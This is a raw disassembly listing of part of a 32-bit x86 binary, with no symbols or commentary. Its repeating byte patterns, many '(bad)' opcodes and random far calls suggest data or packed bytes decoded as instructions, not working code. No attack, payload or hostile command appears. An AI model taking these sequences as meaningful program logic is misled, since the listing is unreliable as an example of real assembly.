  40c5a3:	80 3f 52             	cmpb   $0x52,(%edi)
  40c5a6:	55                   	push   %ebp
  40c5a7:	25 b6 ce 4c bc       	and    $0xbc4cceb6,%eax
  40c5ac:	06                   	push   %es
  40c5ad:	c3                   	ret
  40c5ae:	95                   	xchg   %eax,%ebp
  40c5af:	56                   	push   %esi
  40c5b0:	76 74                	jbe    0x40c626
  40c5b2:	db 5e 8b             	fistpl -0x75(%esi)
  40c5b5:	45                   	inc    %ebp
  40c5b6:	0e                   	push   %cs
  40c5b7:	34 89                	xor    $0x89,%al
  40c5b9:	95                   	xchg   %eax,%ebp
  40c5ba:	01 22                	add    %esp,(%edx)
  40c5bc:	2b bc c1 9a 9a b8 51 	sub    0x51b89a9a(%ecx,%eax,8),%edi
  40c5c3:	2f                   	das
  40c5c4:	4d                   	dec    %ebp
  40c5c5:	2a 66 3e             	sub    0x3e(%esi),%ah
  40c5c8:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5c9:	78 68                	js     0x40c633
  40c5cb:	a1 17 db 00 28       	mov    0x2800db17,%eax
  40c5d0:	00 64 24 ff          	add    %ah,-0x1(%esp)
  40c5d4:	fd                   	std
  40c5d5:	75 11                	jne    0x40c5e8
  40c5d7:	f8                   	clc
  40c5d8:	5d                   	pop    %ebp
  40c5d9:	5b                   	pop    %ebx
  40c5da:	eb 0c                	jmp    0x40c5e8
  40c5dc:	12 c4                	adc    %ah,%al
  40c5de:	80 47 c0 40          	addb   $0x40,-0x40(%edi)
  40c5e2:	c2 ad 57             	ret    $0x57ad
  40c5e5:	30 68 62             	xor    %ch,0x62(%eax)
  40c5e8:	86 8b 72 e5 2a d1    	xchg   %cl,-0x2ed51a8e(%ebx)
  40c5ee:	cc                   	int3
  40c5ef:	f8                   	clc
  40c5f0:	08 06                	or     %al,(%esi)
  40c5f2:	3c b5                	cmp    $0xb5,%al
  40c5f4:	5c                   	pop    %esp
  40c5f5:	cd 7d                	int    $0x7d
  40c5f7:	b2 5b                	mov    $0x5b,%dl
  40c5f9:	1c 0f                	sbb    $0xf,%al
  40c5fb:	85 b0 15 62 c3 ba    	test   %esi,-0x453c9deb(%eax)
  40c601:	06                   	push   %es
  40c602:	b7 d9                	mov    $0xd9,%bh
  40c604:	13 9c a3 14 b9 5d 10 	adc    0x105db914(%ebx,%eiz,4),%ebx
  40c60b:	1c 74                	sbb    $0x74,%al
  40c60d:	d3 9d da 0c f2 23    	rcrl   %cl,0x23f20cda(%ebp)
  40c613:	f4                   	hlt
  40c614:	1f                   	pop    %ds
  40c615:	38 97 ad 13 b3 d9    	cmp    %dl,-0x264cec53(%edi)
  40c61b:	e0 03                	loopne 0x40c620
  40c61d:	01 be 08 78 f9 c7    	add    %edi,-0x380687f8(%esi)
  40c623:	0d fa 56 53 a3       	or     $0xa35356fa,%eax
  40c628:	01 89 1d 3c 70 88    	add    %ecx,-0x778fc3e3(%ecx)
  40c62e:	1d 00 ee b3 1d       	sbb    $0x1db3ee00,%eax
  40c633:	c6                   	(bad)
  40c634:	0d 2c 4b 29 68       	or     $0x68294b2c,%eax
  40c639:	58                   	pop    %eax
  40c63a:	67 0b 1a             	or     (%bp,%si),%ebx
  40c63d:	59                   	pop    %ecx
  40c63e:	20 06                	and    %al,(%esi)
  40c640:	2a 21                	sub    (%ecx),%ah
  40c642:	60                   	pusha
  40c643:	75 b7                	jne    0x40c5fc
  40c645:	f1                   	int1
  40c646:	c5 5b 33             	lds    0x33(%ebx),%ebx
  40c649:	a3 0f 54 d4 7c       	mov    %eax,0x7cd4540f
  40c64e:	f6 d1                	not    %cl
  40c650:	0c d2                	or     $0xd2,%al
  40c652:	5d                   	pop    %ebp
  40c653:	42                   	inc    %edx
  40c654:	53                   	push   %ebx
  40c655:	38 84 89 a1 05 99 ce 	cmp    %al,-0x3166fa5f(%ecx,%ecx,4)
  40c65c:	6c                   	insb   (%dx),%es:(%edi)
  40c65d:	0f 02 06             	lar    (%esi),%eax
  40c660:	13 a4 84 28 3f fc 02 	adc    0x2fc3f28(%esp,%eax,4),%esp
  40c667:	bf 28 eb f6 cc       	mov    $0xccf6eb28,%edi
  40c66c:	cc                   	int3
  40c66d:	55                   	push   %ebp
  40c66e:	83 27 89             	andl   $0xffffff89,(%edi)
  40c671:	e5 51                	in     $0x51,%eax
  40c673:	52                   	push   %edx
  40c674:	b0 1a                	mov    $0x1a,%al
  40c676:	1a 60 9a             	sbb    -0x66(%eax),%ah
  40c679:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40c67a:	eb b6                	jmp    0x40c632
  40c67c:	11 8c 5c 03 58 07 54 	adc    %ecx,0x54075803(%esp,%ebx,2)
  40c683:	64 9c                	fs pushf
  40c685:	69 9a a6 69 88 84 40 	imul   $0xb2383c40,-0x7b77965a(%edx),%ebx
  40c68c:	3c 38 b2 
  40c68f:	69 9a a6 34 44 7c 68 	imul   $0x581a3968,0x7c4434a6(%edx),%ebx
  40c696:	39 1a 58 
  40c699:	d3 74 cd 20          	shll   %cl,0x20(%ebp,%ecx,8)
  40c69d:	1c 03                	sbb    $0x3,%al
  40c69f:	18 14 24             	sbb    %dl,(%esp)
  40c6a2:	4f                   	dec    %edi
  40c6a3:	66 d9 0d 36 48 2b 00 	data16 (bad) 0x2b4836
  40c6aa:	03 fc                	add    %esp,%edi
  40c6ac:	10 f8                	adc    %bh,%al
  40c6ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6af:	b0 c1                	mov    $0xc1,%al
  40c6b1:	9a f4 04 4f 28 2b e0 	lcall  $0xe02b,$0x284f04f4
  40c6b8:	13 77 b6             	adc    -0x4a(%edi),%esi
  40c6bb:	69 ba dc 03 d8 d4 e4 	imul   $0xa64f10e4,-0x2b27fc24(%edx),%edi
  40c6c2:	10 4f a6 
  40c6c5:	03 ae 69 96 4d 04    	add    0x44d9669(%esi),%ebp
  40c6cb:	c0 10 bc             	rclb   $0xbc,(%eax)
  40c6ce:	b8 b4 2b d3 9d       	mov    $0x9dd32bb4,%eax
  40c6d3:	6c                   	insb   (%dx),%es:(%edi)
  40c6d4:	9a c4 fc 86 11 a0 03 	lcall  $0x3a0,$0x1186fcc4
  40c6db:	9c                   	pushf
  40c6dc:	b3 83                	mov    $0x83,%bl
  40c6de:	35 4d 98 94 a4       	xor    $0xa494984d,%eax
  40c6e3:	4f                   	dec    %edi
  40c6e4:	66 11 2b             	adc    %bp,(%ebx)
  40c6e7:	b0 a6                	mov    $0xa6,%al
  40c6e9:	69 ba 80 03 7c 78 74 	imul   $0x3b4f8474,0x787c0380(%edx),%edi
  40c6f0:	84 4f 3b 
  40c6f3:	5d                   	pop    %ebp
  40c6f4:	77 76                	ja     0x40c76c
  40c6f6:	46                   	inc    %esi
  40c6f7:	11 2b                	adc    %ebp,(%ebx)
  40c6f9:	10 07                	adc    %al,(%edi)
  40c6fb:	0c 6f                	or     $0x6f,%al
  40c6fd:	08 af ba 29 7b 2b    	or     %ch,0x2b7b29ba(%edi)
  40c703:	43                   	inc    %ebx
  40c704:	83 b0 03 ac 69 9a ae 	xorl   $0xffffffae,-0x659653fd(%eax)
  40c70b:	69 a8 30 bf 2c 28 24 	imul   $0x74d7cd24,0x282cbf30(%eax),%ebp
  40c712:	cd d7 74 
  40c715:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40c716:	20 03                	and    %al,(%ebx)
  40c718:	18 14 5f             	sbb    %dl,(%edi,%ebx,2)
  40c71b:	10 10                	adc    %dl,(%eax)
  40c71d:	33 4d d3             	xor    -0x2d(%ebp),%ecx
  40c720:	34 10                	xor    $0x10,%al
  40c722:	10 10                	adc    %dl,(%eax)
  40c724:	0f 03 ae 6b 9a a6 f4 	lsl    -0xb596595(%esi),%ebp
  40c72b:	f0 ec                	lock in (%dx),%al
  40c72d:	0e                   	push   %cs
  40c72e:	77 d4                	ja     0x40c704
  40c730:	07                   	pop    %es
  40c731:	dc ce                	fmul   %st,%st(6)
  40c733:	ed                   	in     (%dx),%eax
  40c734:	ba ae 1f aa 03       	mov    $0x3aa1fae,%edx
  40c739:	bf 17 17 03 01       	mov    $0x1031717,%edi
  40c73e:	12 a7 d3 99 af e9    	adc    -0x1650662d(%edi),%ah
  40c744:	1b cc                	sbb    %esp,%ecx
  40c746:	2f                   	das
  40c747:	8b 0f                	mov    (%edi),%ecx
  40c749:	03 b8 34 4d 33 48    	add    0x48334d34(%eax),%edi
  40c74f:	b4 b0                	mov    $0xb0,%ah
  40c751:	ac                   	lods   %ds:(%esi),%al
  40c752:	a8 a4                	test   $0xa4,%al
  40c754:	d3 34 4d d3 a0 9c 98 	shll   %cl,-0x67635f2d(,%ecx,2)
  40c75b:	94                   	xchg   %eax,%esp
  40c75c:	90                   	nop
  40c75d:	4d                   	dec    %ebp
  40c75e:	d3 34 4d 8c 88 84 80 	shll   %cl,-0x7f7b7774(,%ecx,2)
  40c765:	7c 78                	jl     0x40c7df
  40c767:	2c bb                	sub    $0xbb,%al
  40c769:	d7                   	xlat   %ds:(%ebx)
  40c76a:	34 db                	xor    $0xdb,%al
  40c76c:	e6 5f                	out    %al,$0x5f
  40c76e:	03 cf                	add    %edi,%ecx
  40c770:	0f 50 d3             	movmskps %xmm3,%edx
  40c773:	74 4d                	je     0x40c7c2
  40c775:	d3 4c 48 44          	rorl   %cl,0x44(%eax,%ecx,2)
  40c779:	0f 40 3c 4d d3 34 4d 	cmovo  0x384d34d3(,%ecx,2),%edi
  40c780:	38 
  40c781:	34 30                	xor    $0x30,%al
  40c783:	2c 28                	sub    $0x28,%al
  40c785:	4e                   	dec    %esi
  40c786:	34 cd                	xor    $0xcd,%al
  40c788:	96                   	xchg   %eax,%esi
  40c789:	90                   	nop
  40c78a:	11 ff                	adc    %edi,%edi
  40c78c:	0f                   	(bad)
  40c78d:	0f                   	(bad)
  40c78e:	0f b3 34 4d d3 0f 0f 	btr    %esi,0xf0f0fd3(,%ecx,2)
  40c795:	0f 
  40c796:	0f c3 9a ce 34 cd 0f 	movnti %ebx,0xfcd34ce(%edx)
  40c79d:	0f 0e                	femms
  40c79f:	03 f4                	add    %esp,%esi
  40c7a1:	44                   	inc    %esp
  40c7a2:	2c 9b                	sub    $0x9b,%al
  40c7a4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40c7a5:	eb 17                	jmp    0x40c7be
  40c7a7:	50                   	push   %eax
  40c7a8:	03 3c 48             	add    (%eax,%ecx,2),%edi
  40c7ab:	e0 0e                	loopne 0x40c7bb
  40c7ad:	dc ba 2f 48 d3 d8    	fdivrl -0x272cb7d1(%edx)
  40c7b3:	d4 3f                	aam    $0x3f
  40c7b5:	c8 07 c4 41          	enter  $0xc407,$0x41
  40c7b9:	9a a6 e9 03 c0 bc b8 	lcall  $0xb8bc,$0xc003e9a6
  40c7c0:	b4 9a                	mov    $0x9a,%ah
  40c7c2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40c7c3:	69 9a b0 ac a8 a4 a0 	imul   $0xcd929ca0,-0x5b575350(%edx),%ebx
  40c7ca:	9c 92 cd 
  40c7cd:	95                   	xchg   %eax,%ebp
  40c7ce:	6d                   	insl   (%dx),%es:(%edi)
  40c7cf:	98                   	cwtl
  40c7d0:	0e                   	push   %cs
  40c7d1:	4f                   	dec    %edi
  40c7d2:	d0 cc                	ror    $1,%ah
  40c7d4:	0e                   	push   %cs
  40c7d5:	ae                   	scas   %es:(%edi),%al
  40c7d6:	69 9a ee db 63 d7 b7 	imul   $0xaf8664b7,-0x289c2412(%edx),%ebx
  40c7dd:	64 86 af 
  40c7e0:	35 4d d3 9d 82       	xor    $0x829dd34d,%eax
  40c7e5:	0b 45 6c             	or     0x6c(%ebp),%eax
  40c7e8:	4c                   	dec    %esp
  40c7e9:	97                   	xchg   %eax,%edi
  40c7ea:	4d                   	dec    %ebp
  40c7eb:	33 58 d3             	xor    -0x2d(%eax),%ebx
  40c7ee:	07                   	pop    %es
  40c7ef:	44                   	inc    %esp
  40c7f0:	40                   	inc    %eax
  40c7f1:	03 68 34             	add    0x34(%eax),%ebp
  40c7f4:	20 36                	and    %dh,(%esi)
  40c7f6:	5d                   	pop    %ebp
  40c7f7:	d3 34 1c             	shll   %cl,(%esp,%ebx,1)
  40c7fa:	18 14 27             	sbb    %dl,(%edi,%eiz,1)
  40c7fd:	2b 27                	sub    (%edi),%esp
  40c7ff:	0f b3 ec             	btr    %ebp,%esp
  40c802:	dc cb                	fmul   %st,%st(3)
  40c804:	0f 8a 17 af 03 51    	jp     0x51447721
  40c80a:	18 af b9 6c 9a 65    	sbb    %ch,0x659a6cb9(%edi)
  40c810:	2a 19                	sub    (%ecx),%bl
  40c812:	78 de                	js     0x40c7f2
  40c814:	31 1a                	xor    %ebx,(%edx)
  40c816:	f4                   	hlt
  40c817:	0d a6 69 9a 66       	or     $0x669a69a6,%eax
  40c81c:	f0 ec                	lock in (%dx),%al
  40c81e:	e8 e4 e0 4e c3       	call   0xc38fa907
  40c823:	6b 9a dc d8 10 ff 03 	imul   $0x3,-0xef2724(%edx),%ebx
  40c82a:	c6                   	(bad)
  40c82b:	6b 9a a6 eb 0f c0 03 	imul   $0x3,-0x3ff0145a(%edx),%ebx
  40c832:	bc b8 b4 7e fb       	mov    $0xfb7eb4b8,%esp
  40c837:	68 9a cb e5 0d       	push   $0xde5cb9a
  40c83c:	f3 15 36 16 0d 0d    	repz adc $0xd0d1636,%eax
  40c842:	4d                   	dec    %ebp
  40c843:	b3 ec                	mov    $0xec,%bl
  40c845:	ce                   	into
  40c846:	93                   	xchg   %eax,%ebx
  40c847:	5a                   	pop    %edx
  40c848:	03 90 0d 8c 88 84    	add    -0x7b7773f3(%eax),%edx
  40c84e:	e9 ce d8 34 80       	jmp    0x8075a121
  40c853:	7c 0d                	jl     0x40c862
  40c855:	bb c5 03 e2 db       	mov    $0xdbe203c5,%ebx
  40c85a:	35 cb a6 ff 58       	xor    $0x58ffa6cb,%eax
  40c85f:	0d 54 be 67 5c       	or     $0x5c67be54,%eax
  40c864:	0d 0f 74 af e9       	or     $0xe9af740f,%eax
  40c869:	2e 50                	cs push %eax
  40c86b:	03 4c a6 ff          	add    -0x1(%esi,%eiz,4),%ecx
  40c86f:	07                   	pop    %es
  40c870:	9e                   	sahf
  40c871:	e9 0e 5d d3 2c       	jmp    0x2d142584
  40c876:	38 03                	cmp    %al,(%ebx)
  40c878:	92                   	xchg   %eax,%edx
  40c879:	ef                   	out    %eax,(%dx)
  40c87a:	af                   	scas   %es:(%edi),%eax
  40c87b:	1c 4d                	sbb    $0x4d,%al
  40c87d:	d3 9d a6 18 14 03    	rcrl   %cl,0x31418a6(%ebp)
  40c883:	0c 08                	or     $0x8,%al
  40c885:	04 4d                	add    $0x4d,%al
  40c887:	b3 5c                	mov    $0x5c,%bl
  40c889:	36 85 14 fc          	test   %edx,%ss:(%esp,%edi,8)
  40c88d:	0c f8                	or     $0xf8,%al
  40c88f:	f4                   	hlt
  40c890:	f0 0d 4d d3 34 ec    	lock or $0xec34d34d,%eax
  40c896:	e8 e4 28 47 24       	call   0x2487f17f
  40c89b:	76 5d                	jbe    0x40c8fa
  40c89d:	37                   	aaa
  40c89e:	20 3e                	and    %bh,(%esi)
  40c8a0:	53                   	push   %ebx
  40c8a1:	3a 03                	cmp    (%ebx),%al
  40c8a3:	36 ef                	ss out %eax,(%dx)
  40c8a5:	32 0f                	xor    (%edi),%cl
  40c8a7:	d7                   	xlat   %ds:(%ebx)
  40c8a8:	34 9d                	xor    $0x9d,%al
  40c8aa:	69 0c 03 b8 b4 b0 0f 	imul   $0xfb0b4b8,(%ebx,%eax,1),%ecx
  40c8b1:	37                   	aaa
  40c8b2:	80 34 4d ac a8 a4 a0 	xorb   $0x3,-0x5f5b5754(,%ecx,2)
  40c8b9:	03 
  40c8ba:	b3 3d                	mov    $0x3d,%bl
  40c8bc:	1d 4d 9c f6 2b       	sbb    $0x2bf69c4d,%eax
  40c8c1:	f2 15 07 ea 4d d3    	repnz adc $0xd34dea07,%eax
  40c8c7:	35 4d db e2 de       	xor    $0xdee2db4d,%eax
  40c8cc:	03 da                	add    %edx,%ebx
  40c8ce:	d6                   	salc
  40c8cf:	d2 34 4d d7 35 60 2b 	shlb   %cl,0x2b6035d7(,%ecx,2)
  40c8d6:	5c                   	pop    %esp
  40c8d7:	03 58 54             	add    0x54(%eax),%ebx
  40c8da:	50                   	push   %eax
  40c8db:	d3 74 4d d3          	shll   %cl,-0x2d(%ebp,%ecx,2)
  40c8df:	4c                   	dec    %esp
  40c8e0:	48                   	dec    %eax
  40c8e1:	44                   	inc    %esp
  40c8e2:	b7 40                	mov    $0x40,%bh
  40c8e4:	3c ba                	cmp    $0xba,%al
  40c8e6:	d3 34 4d 38 34 30 2c 	shll   %cl,0x2c303438(,%ecx,2)
  40c8ed:	03 24 69             	add    (%ecx,%ebp,2),%esp
  40c8f0:	9a a6 69 20 1c 18 14 	lcall  $0x1418,$0x1c2069a6
  40c8f7:	10 ba 66 9a a6 0c    	adc    %bh,0xca69a66(%edx)
  40c8fd:	08 04 0c             	or     %al,(%esp,%ecx,1)
  40c900:	ff 0b                	decl   (%ebx)
  40c902:	d3 34 4d 67 03 f4 f0 	shll   %cl,-0xf0bfc99(,%ecx,2)
  40c909:	ec                   	in     (%dx),%al
  40c90a:	e8 4d d3 34 4d       	call   0x4d759c5c
  40c90f:	e4 e0                	in     $0xe0,%al
  40c911:	dc d8                	(bad)
  40c913:	d4 d0                	aam    $0xd0
  40c915:	34 4d                	xor    $0x4d,%al
  40c917:	d3 34 cc             	shll   %cl,(%esp,%ecx,8)
  40c91a:	c8 c4 c0 bc          	enter  $0xc0c4,$0xbc
  40c91e:	d3 34 4d d3 b8 b4 c9 	shll   %cl,-0x364b472d(,%ecx,2)
  40c925:	c5 a8 90 05 36 4d    	lds    0x4d360590(%eax),%ebp
  40c92b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40c92c:	a0 8e 10 b7 15       	mov    0x15b7108e,%al
  40c931:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40c932:	69 ba 6e 90 0f 8c 03 	imul   $0x80948803,-0x73f06f92(%edx),%edi
  40c939:	88 94 80 
  40c93c:	cd b2                	int    $0xb2
  40c93e:	73 9b                	jae    0x40c8db
  40c940:	7c e6                	jl     0x40c928
  40c942:	0d ff 03 70 0b       	or     $0xb7003ff,%eax
  40c947:	6c                   	insb   (%dx),%es:(%edi)
  40c948:	68 96 4d d3 34       	push   $0x34d34d96
  40c94d:	64 b0 ac             	fs mov $0xac,%al
  40c950:	89 0c 85 61 b3 a6 69 	mov    %ecx,0x69a6b361(,%eax,4)
  40c957:	81 7d 98 3f 4f 35 70 	cmpl   $0x70354f3f,-0x68(%ebp)
  40c95e:	03 32                	add    (%edx),%esi
  40c960:	84 78 03             	test   %bh,0x3(%eax)
  40c963:	e8 d3 34 4d d3       	call   0xd38dfe3b
  40c968:	ff 0b                	decl   (%ebx)
  40c96a:	0b 0b                	or     (%ebx),%ecx
  40c96c:	0b 0b                	or     (%ebx),%ecx
  40c96e:	4d                   	dec    %ebp
  40c96f:	d3 34 4d 0b 0b 0b 0b 	shll   %cl,0xb0b0b0b(,%ecx,2)
  40c976:	0a 0a                	or     (%edx),%cl
  40c978:	69 3a d3 34 0a 0a    	imul   $0xa0a34d3,(%edx),%edi
  40c97e:	0f e8 e4             	psubsb %mm4,%mm4
  40c981:	5d                   	pop    %ebp
  40c982:	f7 9a 21 d4 4b ff    	negl   -0xb42bdf(%edx)
  40c988:	07                   	pop    %es
  40c989:	36 ab                	ss stos %eax,%es:(%edi)
  40c98b:	32 af e9 ce 76 03    	xor    0x376cee9(%edi),%ch
  40c991:	d0 0a                	rorb   $1,(%edx)
  40c993:	0f c8                	bswap  %eax
  40c995:	03 b4 2b af a6 33 dd 	add    -0x22cc5951(%ebx,%ebp,1),%esi
  40c99c:	83 0a 7f             	orl    $0x7f,(%edx)
  40c99f:	ff 0a                	decl   (%edx)
  40c9a1:	03 9c 9a a6 e9 9a 98 	add    -0x6765165a(%edx,%ebx,4),%ebx
  40c9a8:	94                   	xchg   %eax,%esp
  40c9a9:	0f 90 8c 88 84 d3 75 	seto   0x775d384(%eax,%ecx,4)
  40c9b0:	07 
  40c9b1:	69 80 ec 0e af 0a ff 	imul   $0xa69a0aff,0xaaf0eec(%eax),%eax
  40c9b8:	0a 9a a6 
  40c9bb:	33 4d 0a             	xor    0xa(%ebp),%ecx
  40c9be:	0a 0f                	or     (%edi),%cl
  40c9c0:	60                   	pusha
  40c9c1:	5c                   	pop    %esp
  40c9c2:	58                   	pop    %eax
  40c9c3:	6c                   	insb   (%dx),%es:(%edi)
  40c9c4:	9a a6 69 54 50 4c 48 	lcall  $0x484c,$0x505469a6
  40c9cb:	d9 0e                	(bad) (%esi)
  40c9cd:	d3 34 dd 85 44 03 40 	shll   %cl,0x40034485(,%ebx,8)
  40c9d4:	3c 38                	cmp    $0x38,%al
  40c9d6:	4d                   	dec    %ebp
  40c9d7:	d3 34 4d 34 20 1c 18 	shll   %cl,0x181c2034(,%ecx,2)
  40c9de:	14 10                	adc    $0x10,%al
  40c9e0:	4d                   	dec    %ebp
  40c9e1:	c3                   	ret
  40c9e2:	d7                   	xlat   %ds:(%ebx)
  40c9e3:	34 0c                	xor    $0xc,%al
  40c9e5:	a9 ff 0a ff 0a       	test   $0xaff0aff,%eax
  40c9ea:	09 34 4d d3 34 09 09 	or     %esi,0x90934d3(,%ecx,2)
  40c9f1:	09 09                	or     %ecx,(%ecx)
  40c9f3:	09 d3                	or     %edx,%ebx
  40c9f5:	34 4d                	xor    $0x4d,%al
  40c9f7:	d3 09                	rorl   %cl,(%ecx)
  40c9f9:	09 09                	or     %ecx,(%ecx)
  40c9fb:	09 09                	or     %ecx,(%ecx)
  40c9fd:	ba ee 2c 4d 09       	mov    $0x94d2cee,%edx
  40ca02:	09 69 07             	or     %ebp,0x7(%ecx)
  40ca05:	c0 03 bc             	rolb   $0xbc,(%ebx)
  40ca08:	69 9a a6 69 b8 b4 b0 	imul   $0x69a8acb0,-0x4b47965a(%edx),%ebx
  40ca0f:	ac a8 69 
  40ca12:	9a ee b1 a4 09 5b ff 	lcall  $0xff5b,$0x9a4b1ee
  40ca19:	09 09                	or     %ecx,(%ecx)
  40ca1b:	09 4d d3             	or     %ecx,-0x2d(%ebp)
  40ca1e:	99                   	cltd
  40ca1f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40ca20:	09 09                	or     %ecx,(%ecx)
  40ca22:	3b 84 80 7c 34 4d d3 	cmp    -0x2cb2cb84(%eax,%eax,4),%eax
  40ca29:	34 78                	xor    $0x78,%al
  40ca2b:	74 70                	je     0x40ca9d
  40ca2d:	6c                   	insb   (%dx),%es:(%edi)
  40ca2e:	68 d3 34 5d d3       	push   $0xd35d34d3
  40ca33:	d2 60 33             	shlb   %cl,0x33(%eax)
  40ca36:	5c                   	pop    %esp
  40ca37:	58                   	pop    %eax
  40ca38:	54                   	push   %esp
  40ca39:	4d                   	dec    %ebp
  40ca3a:	d3 34 4d 50 4c 48 44 	shll   %cl,0x44484c50(,%ecx,2)
  40ca41:	40                   	inc    %eax
  40ca42:	3c 74                	cmp    $0x74,%al
  40ca44:	4d                   	dec    %ebp
  40ca45:	d3 34 38             	shll   %cl,(%eax,%edi,1)
  40ca48:	34 9e                	xor    $0x9e,%al
  40ca4a:	9a 03 96 d3 74 5d d3 	lcall  $0xd35d,$0x74d39603
  40ca51:	92                   	xchg   %eax,%edx
  40ca52:	39 13                	cmp    %edx,(%ebx)
  40ca54:	8a 0f                	mov    (%edi),%cl
  40ca56:	86 82 4d d7 75 4d    	xchg   %al,0x4d75d74d(%edx)
  40ca5c:	29 25 03 76 0b 1d    	sub    %esp,0x1d0b7603
  40ca62:	07                   	pop    %es
  40ca63:	6e                   	outsb  %ds:(%esi),(%dx)
  40ca64:	6a 3a                	push   $0x3a
  40ca66:	f3 34 1d             	repz xor $0x1d,%al
  40ca69:	ff 66 62             	jmp    *0x62(%esi)
  40ca6c:	08 03                	or     %al,(%ebx)
  40ca6e:	e8 6b ba a6 6b       	call   0x6be784de
  40ca73:	52                   	push   %edx
  40ca74:	0f f9 f5             	psubw  %mm5,%mm6
  40ca77:	03 f1                	add    %ecx,%esi
  40ca79:	ed                   	in     (%dx),%eax
  40ca7a:	1b b2 6b 9a a6 e9    	sbb    -0x16596595(%edx),%esi
  40ca80:	e5 36                	in     $0x36,%eax
  40ca82:	32 03                	xor    (%ebx),%al
  40ca84:	d9 08                	(bad) (%eax)
  40ca86:	66 d9 34 cd d5 d1 cd 	fnstenvs 0x1ecdd1d5(,%ecx,8)
  40ca8d:	1e 
  40ca8e:	0b 1a                	or     (%edx),%ebx
  40ca90:	5d                   	pop    %ebp
  40ca91:	b3 6c                	mov    $0x6c,%bl
  40ca93:	9a 16 12 b9 08 b5 b1 	lcall  $0xb1b5,$0x8b91216
  40ca9a:	07                   	pop    %es
  40ca9b:	ad                   	lods   %ds:(%esi),%eax
  40ca9c:	9a 65 d3 34 a9 a5 f6 	lcall  $0xf6a5,$0xa934d365
  40caa3:	0a 9d 99 e9 9a a6    	or     -0x59651667(%ebp),%bl
  40caa9:	e9 03 95 91 8d       	jmp    0x8dd25fb1
  40caae:	89 2f                	mov    %ebp,(%edi)
  40cab0:	85 a6 69 9a a6 81    	test   %esp,-0x7e596597(%esi)
  40cab6:	7d 79                	jge    0x40cb31
  40cab8:	75 c6                	jne    0x40ca80
  40caba:	9a a6 69 ba c2 03 be 	lcall  $0xbe03,$0xc2ba69a6
  40cac1:	ba b6 b2 ae 69       	mov    $0x69aeb2b6,%edx
  40cac6:	9a a6 69 aa a6 a2 9e 	lcall  $0x9ea2,$0xa6aa69a6
  40cacd:	9a a6 69 9a a6 96 92 	lcall  $0x9296,$0xa69a69a6
  40cad4:	8e 8a 86 9a a6 69    	mov    0x69a69a86(%edx),%cs
  40cada:	9a 82 7e 7a 76 72 6e 	lcall  $0x6e72,$0x767a7e82
  40cae1:	69 9a a6 69 6a 66 62 	imul   $0xa65a5e62,0x666a69a6(%edx),%ebx
  40cae8:	5e 5a a6 
  40caeb:	69 9a a6 56 52 4e 4a 	imul   $0xa69a464a,0x4e5256a6(%edx),%ebx
  40caf2:	46 9a a6 
  40caf5:	69 9a 42 3e 3a 36 32 	imul   $0x9a692e32,0x363a3e42(%edx),%ebx
  40cafc:	2e 69 9a 
  40caff:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb00:	69 2a 26 22 1e 1a    	imul   $0x1a1e2226,(%edx),%ebp
  40cb06:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb07:	69 9a a6 16 12 0e 0a 	imul   $0xd34d060a,0xe1216a6(%edx),%ebx
  40cb0e:	06 4d d3 
  40cb11:	2c 9b                	sub    $0x9b,%al
  40cb13:	02 fe                	add    %dh,%bh
  40cb15:	09 fa                	or     %edi,%edx
  40cb17:	f6 f2                	div    %dl
  40cb19:	ee                   	out    %al,(%dx)
  40cb1a:	34 4d                	xor    $0x4d,%al
  40cb1c:	d3 34 ea             	shll   %cl,(%edx,%ebp,8)
  40cb1f:	e6 e2                	out    %al,$0xe2
  40cb21:	de da                	(bad)
  40cb23:	e9 36 4d d3 d6       	jmp    0xd714185e
  40cb28:	d2 ce                	ror    %cl,%dh
  40cb2a:	ca 09 ff             	lret   $0xff09
  40cb2d:	09 a6 69 9a a6 09    	or     %esp,0x9a69a69(%esi)
  40cb33:	09 09                	or     %ecx,(%ecx)
  40cb35:	09 09                	or     %ecx,(%ecx)
  40cb37:	9a a6 69 9a 09 09 09 	lcall  $0x909,$0x99a69a6
  40cb3e:	09 09                	or     %ecx,(%ecx)
  40cb40:	09 69 9a             	or     %ebp,-0x66(%ecx)
  40cb43:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb44:	69 09 09 09 09 09    	imul   $0x9090909,(%ecx),%ecx
  40cb4a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb4b:	69 9a a6 09 09 09 09 	imul   $0xa69a0909,0x90909a6(%edx),%ebx
  40cb52:	09 9a a6 
  40cb55:	69 9a 09 09 09 09 09 	imul   $0x9a690909,0x9090909(%edx),%ebx
  40cb5c:	09 69 9a 
  40cb5f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb60:	69 09 09 09 09 09    	imul   $0x9090909,(%ecx),%ecx
  40cb66:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb67:	69 9a a6 09 09 09 09 	imul   $0xa69a0909,0x90909a6(%edx),%ebx
  40cb6e:	09 9a a6 
  40cb71:	69 9a 09 09 09 09 09 	imul   $0x9a690909,0x9090909(%edx),%ebx
  40cb78:	09 69 9a 
  40cb7b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb7c:	69 09 09 09 09 09    	imul   $0x9090909,(%ecx),%ecx
  40cb82:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb83:	69 9a a6 09 08 08 08 	imul   $0xa69a0808,0x80809a6(%edx),%ebx
  40cb8a:	08 9a a6 
  40cb8d:	69 9a 08 08 08 08 08 	imul   $0x9a690808,0x8080808(%edx),%ebx
  40cb94:	08 69 9a 
  40cb97:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb98:	69 08 08 08 08 08    	imul   $0x8080808,(%eax),%ecx
  40cb9e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40cb9f:	69 9a a6 08 08 08 08 	imul   $0xa69a0808,0x80808a6(%edx),%ebx
  40cba6:	08 9a a6 
  40cba9:	69 9a 08 08 08 08 08 	imul   $0x9a690808,0x8080808(%edx),%ebx
